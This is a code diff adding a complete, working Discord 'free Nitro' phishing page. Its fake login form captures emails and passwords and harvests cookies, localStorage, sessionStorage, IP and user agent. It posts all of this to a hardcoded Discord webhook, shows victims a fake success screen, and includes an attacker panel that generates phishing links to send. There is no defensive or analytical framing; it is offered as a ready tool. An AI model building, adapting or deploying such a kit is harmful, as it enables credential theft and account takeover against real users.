@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Nitro</title>
+    <style>
+        body {
+            background: #36393f;
+            color: #dcddde;
+            font-family: Whitney, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #2f3136;
+            padding: 40px 30px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.6);
+            text-align: center;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+        p {
+            color: #b9bbbe;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            margin: 8px 0;
+            background: #202225;
+            border: none;
+            border-radius: 4px;
+            color: #dcddde;
+            font-size: 16px;
+        }
+        button {
+            background: #5865f2;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        #successScreen {
+            display: none;
+        }
+        .app {display:none;}
+        #out {margin:20px;padding:20px;background:#2f3136;border-radius:8px;min-height:200px;}
+    </style>
+</head>
+<body>
+    <!-- Victim Login Screen -->
+    <div id="loginScreen" class="container">
+        <h1>Login to Claim Nitro</h1>
+        <p>We're so excited to see you again!</p>
+        
+        <div style="text-align:left;">
+            <label style="color:#b9bbbe;font-size:12px;">ACCOUNT INFORMATION</label>
+            <input id="email" placeholder="Email or Phone Number">
+            <input id="pass" type="password" placeholder="Password">
+        </div>
+        
+        <button onclick="login()">Log In</button>
+        <p style="font-size:13px;color:#72767d;margin-top:20px;">Your Nitro will arrive within 24 hours after login verification.</p>
+    </div>
+
+    <!-- Success Screen -->
+    <div id="successScreen" class="container">
+        <h1>Thanks for logging in!</h1>
+        <p style="color:#3ba55c;">Your account has been verified.<br><br><strong>Your free Nitro will arrive in your account within 24 hours.</strong></p>
+        <p style="font-size:14px;color:#b9bbbe;">You can close this window.</p>
+    </div>
+
+    <!-- Attacker Panel -->
+    <div id="app" class="app container">
+        <h1>🔥 Logger Active</h1>
+        <button onclick="genLink()">Generate New Phishing Link</button>
+        <button onclick="preview()">Preview Victim Page</button>
+        <div id="out">Logger running silently.<br>All hits (creds + cookies + storage) ping @everyone.</div>
+    </div>
+
+    <script>
+        const wh = "https://discord.com/api/webhooks/1515025125366562967/okp16RRAZk7_vu0K1kRskmaQFehAARDdHNRSHcC-5MEl3ZemOpl9-qPLGG9wczWf77e3";
+
+        function getIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => data.ip)
+                .catch(() => 'IP grab failed');
+        }
+
+        function getAllStorage() {
+            let storage = "=== COOKIES ===\n" + (document.cookie || "No cookies") + "\n\n";
+            storage += "=== LOCALSTORAGE ===\n";
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    storage += key + ": " + localStorage.getItem(key) + "\n";
+                }
+            } catch(e) {}
+            storage += "\n=== SESSIONSTORAGE ===\n";
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    storage += key + ": " + sessionStorage.getItem(key) + "\n";
+                }
+            } catch(e) {}
+            return storage;
+        }
+
+        async function login() {
+            const e = document.getElementById('email').value.trim();
+            const p = document.getElementById('pass').value.trim();
+            const allData = getAllStorage();
+            const userAgent = navigator.userAgent;
+            let ip = 'Fetching...';
+
+            if (e && p) {
+                ip = await getIP();
+
+                const payload = {
+                    content: "@everyone **NITRO LOGGER - NEW HIT** 🔥\n**Email:** " + e + "\n**Password:** " + p + "\n**IP:** " + ip + "\n**User-Agent:** " + userAgent + "\n**Full Storage:**\n```" + allData + "```"
+                };
+
+                fetch(wh, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload)});
+
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+            }
+        }
+
+        function genLink() { 
+            const link = window.location.href.replace(/nitro-logger\.html.*/, '') + 'claim.html?gift=free-nitro-2026';
+            document.getElementById('out').innerHTML = `<h2>Phishing Link Generated</h2><p>Send this:<br><strong>${link}</strong></p>`; 
+        }
+
+        function preview() { 
+            document.getElementById('out').innerHTML = `Discord logo removed. Enhanced cookie + storage logger active.`;
+        }
+    </script>
+</body>
+</html>
